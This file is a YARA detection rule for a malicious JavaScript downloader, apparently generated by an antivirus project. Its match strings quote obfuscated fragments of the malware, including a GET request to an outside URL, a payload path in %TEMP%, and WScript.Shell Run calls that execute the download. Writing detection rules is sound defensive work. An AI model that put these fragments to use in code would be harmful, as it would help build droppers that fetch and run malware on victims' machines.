rule sig_20160328_8b13903ec007ee54a5debe4e1954992e {
  meta:
    description = "datamaliciousorder - file 20160328_8b13903ec007ee54a5debe4e1954992e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3ad41f85c51428fd1c035bd4dd44ab9117e6a775432253b45d456707d272c198"

  strings:
    $s1  = "function Xobhuknsr() {return Mbzsvxkpi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5Ri7VGYo6cx.exe\";};" fullword ascii
    $s2  = "Attfuupkwa[Txxrm](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Zyemgukb](Zykkpl() * 11)} while (Attfuupkwa[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Mbzsvxkpi = function Tnxmxdvtfx() {return WScript[Zdsfzje](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Sgazobdqm(Ztswazdac, Vlddhuip){return Ztswazdac - Vlddhuip;};" fullword ascii
    $s6  = "return Sgazobdqm(Xzurjxti, Fpdllaaoe);" fullword ascii
    $s7  = "function Lohbnrzovp() {return ((Zvtqvyiwb == true) && (Zvtqvyiwb == Wtadh)) ? 1 : Gtpgdd;};" fullword ascii
    $s8  = "function Obkvoq(Whgkdbu){Mbzsvxkpi[\"Run\"](Whgkdbu, Gtpgdd, Gtpgdd);};" fullword ascii
    $s9  = "Wtadh = true; " fullword ascii
    $s10 = "function Hyhphesb(){return Zdsfzje;};" fullword ascii
    $s11 = "Zvtqvyiwb = true; " fullword ascii
    $s12 = "function Simuhsm()" fullword ascii
    $s13 = "var Lhpas = false;" fullword ascii
    $s14 = "var Zvtqvyiwb = false;" fullword ascii
    $s15 = " while (Ebqxe){" fullword ascii
    $s16 = "var Xqnjqbg = new this[\"Date\"]();" fullword ascii
    $s17 = "function Aairjd(Soctzgbh) {var Giohmtgse = (1, 2, 3, 4, 5, Soctzgbh); return Giohmtgse;};" fullword ascii
    $s18 = "function Tliywe(){return Rncqgfrr;};" fullword ascii
    $s19 = "function Zykkpl(){return 22;};" fullword ascii
    $s20 = "var Wtadh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}